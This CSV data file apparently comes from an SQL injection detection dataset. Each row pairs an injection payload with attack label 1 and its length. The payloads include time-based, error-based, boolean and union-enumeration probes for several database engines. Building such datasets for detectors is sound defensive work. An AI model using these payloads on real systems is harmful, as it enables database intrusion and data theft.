sentence,attack_type,len_payload
"1%""  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  ""%"" = """,1,106
"1%""  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""%"" = """,1,135
"1%""  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1,65
"1%""  )  )   and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,88
"1%""  )  )   and 9198 = 9198--",1,29
"1%""  )  )   and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,129
"1%""  )  )   and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,120
"1%""  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,198
"1%""  )  )   and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,153
"1%""  )  )   and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""%"" = """,1,216
"1%""  )  )   and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (  ""%"" = """,1,173
"1%""  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  ""%"" = """,1,71
"1%""  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,52
"1%""  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  ""%"" = """,1,61
"1%""  )  )   and elt ( 7633 = 4110,4110 )  and   (  (  ""%"" = """,1,61
"1%""  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""%"" = """,1,170
"1%""  )  )   and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (  ""%"" = """,1,147
"1%""  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  ""%"" = """,1,66
"1%""  )  )   and make_set ( 9897 = 5557,5557 )  and   (  (  ""%"" = """,1,66
"1%""  )  )   and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (  ""%"" = """,1,279
"1%""  )  )   and sleep ( 5 )  and   (  (  ""%"" = """,1,48
"1%""  )  )   and sleep ( 5 ) #",1,29
"1%""  )  )   and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (  ""%"" = """,1,147
"1%""  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,72
"1%""  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  ""%"" = """,1,91
"1%""  )  )   or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""%"" = """,1,232
"1%""  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  ""%"" = """,1,243
"1%""  )  )   or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,119
"1%""  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,128
"1%""  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  ""%"" = """,1,127
"1%""  )  )   or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1,64
"1%""  )  )   or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  ""%"" = """,1,191
"1%""  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,116
"1%""  )  )   or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  ""%"" = """,1,137
"1%""  )  )   or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,173
"1%""  )  )   or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (  ""%"" = """,1,82
"1%""  )  )   or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,95
"1%""  )  )   or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,123
"1%""  )  )   or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,109
"1%""  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""%"" = """,1,146
"1%""  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,87
"1%""  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  ""%"" = """,1,141
"1%""  )  )   or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""%"" = """,1,113
"1%""  )  )   or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  ""%"" = """,1,105
"1%""  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  ""%"" = """,1,86
"1%""  )  )   or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,67
"1%""  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""%"" = """,1,134
"1%""  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""%"" = """,1,217
"1%""  )  )   or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,154
"1%""  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  ""%"" = """,1,169
"1%""  )  )   or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,195
"1%""  )  )   or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,51
"1%""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""%"" = """,1,70
"1%""  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""%"" = """,1,169
"1%""  )  )   or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (  ""%"" = """,1,146
"1%""  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  ""%"" = """,1,278
"1%""  )  )   or sleep ( 5 )  and   (  (  ""%"" = """,1,47
"1%""  )  )   or sleep ( 5 ) #",1,28
"1%""  )  )   or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (  ""%"" = """,1,146
"1%""  )  )   order by 1--",1,24
"1%""  )  )   order by 1#",1,23
"1%""  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  ""%"" = """,1,191
"1%""  )  )   procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (  ""%"" = """,1,149
"1%""  )  )   procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,130
"1%""  )  )   rlike  ( select  ( case when  ( 4207 = 1757 )  then 1 else 0x28 end  )  )   and   (  (  ""%"" = """,1,107
"1%""  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  ""%"" = """,1,107
"1%""  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  ""%"" = """,1,94
"1%""  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1,75
"1%""  )  )   rlike sleep ( 5 )  and   (  (  ""%"" = """,1,50
"1%""  )  )   rlike sleep ( 5 ) #",1,31
"1%""  )  )   union all select null--",1,35
"1%""  )  )   union all select null#",1,34
"1%""  )  )   union all select null,null--",1,40
"1%""  )  )   union all select null,null#",1,39
"1%""  )  )   union all select null,null,null--",1,45
"1%""  )  )   union all select null,null,null#",1,44
"1%""  )  )   union all select null,null,null,null--",1,50
"1%""  )  )   union all select null,null,null,null#",1,49
"1%""  )  )   union all select null,null,null,null,null--",1,55
"1%""  )  )   union all select null,null,null,null,null#",1,54
"1%""  )  )   union all select null,null,null,null,null,null--",1,60
"1%""  )  )   union all select null,null,null,null,null,null#",1,59
"1%""  )  )   union all select null,null,null,null,null,null,null--",1,65
"1%""  )  )   union all select null,null,null,null,null,null,null#",1,64
"1%""  )  )   union all select null,null,null,null,null,null,null,null--",1,70
"1%""  )  )   union all select null,null,null,null,null,null,null,null#",1,69
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null--",1,75
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null#",1,74
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null,null--",1,80
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null,null#",1,79
"1%""  )  )   waitfor delay '0:0:5'--",1,35
"1%""  )  )   waitfor delay '0:0:5' and   (  (  ""%"" = """,1,53
"1%"" ) ",1,5
"1%"" )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and  ( ""%"" = """,1,286
"1%"" )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and  ( ""%"" = """,1,253
"1%"" )  and  ( 3020 = 3020 ) *6703 and  ( ""%"" = """,1,48
"1%"" )  and  ( 6016 = 4763 ) *4763 and  ( ""%"" = """,1,48
"1%"" )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( ""%"" = """,1,82
"1%"" )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1,68
"1%"" )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""%"" = """,1,223
"1%"" )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( ""%"" = """,1,234
"1%"" )  and 2006 = 2006",1,22
"1%"" )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,63
"1%"" )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,169
"1%"" )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""%"" = """,1,284
"1%"" )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""%"" = """,1,104
"1%"" )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,112
"1%"" )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""%"" = """,1,132
"1%"" )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""%"" = """,1,278
"1%"" )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""%"" = """,1,335
"1%"" )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( ""%"" = """,1,77
"1%"" )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""%"" = """,1,293
"1%"" )  and 4386 = utl_inaddr.0_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( ""%"" = """,1,282
"1%"" )  and 4595 = 4595#",1,23
"1%"" )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( ""%"" = """,1,128
"1%"" )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""%"" = """,1,283
"1%"" )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""%"" = """,1,125
"1%"" )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""%"" = """,1,137
"1%"" )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""%"" = """,1,182
"1%"" )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( ""%"" = """,1,118
"1%"" )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( ""%"" = """,1,73
"1%"" )  and 7533 = 7533 and  ( ""%"" = """,1,37
"1%"" )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""%"" = """,1,292
"1%"" )  and 8024 = 3560--",1,24
"1%"" )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,91
"1%"" )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,119
"1%"" )  and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,104
"1%"" )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( ""%"" = """,1,96
"1%"" )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( ""%"" = """,1,125
"1%"" )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1,60
"1%"" )  and 8626 = 3626#",1,23
"1%"" )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,83
"1%"" )  and 8715 = 5529",1,22
"1%"" )  and 9198 = 9198--",1,24
"1%"" )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,124
"1%"" )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,115
"1%"" )  and 9764 = 6037 and  ( ""%"" = """,1,37
"1%"" )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,193
"1%"" )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,148
"1%"" )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""%"" = """,1,206
"1%"" )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( ""%"" = """,1,163
"1%"" )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( ""%"" = """,1,61
"1%"" )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,47
"1%"" )  and elt ( 4249 = 4249,7259 )  and  ( ""%"" = """,1,51
"1%"" )  and elt ( 7436 = 9874,9874 )  and  ( ""%"" = """,1,51
"1%"" )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""%"" = """,1,160
"1%"" )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( ""%"" = """,1,137
"1%"" )  and make_set ( 8403 = 8403,8899 )  and  ( ""%"" = """,1,56
"1%"" )  and make_set ( 9956 = 1060,1060 )  and  ( ""%"" = """,1,56
"1%"" )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( ""%"" = """,1,269
"1%"" )  and sleep ( 5 )  and  ( ""%"" = """,1,38
"1%"" )  and sleep ( 5 ) #",1,24
"1%"" )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and  ( ""%"" = """,1,137
"1%"" )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,67
"1%"" )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and  ( ""%"" = """,1,81
"1%"" )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""%"" = """,1,222
"1%"" )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( ""%"" = """,1,233
"1%"" )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,114
"1%"" )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,123
"1%"" )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and  ( ""%"" = """,1,117
"1%"" )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1,59
"1%"" )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""%"" = """,1,181
"1%"" )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,111
"1%"" )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( ""%"" = """,1,127
"1%"" )  or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,168
"1%"" )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( ""%"" = """,1,72
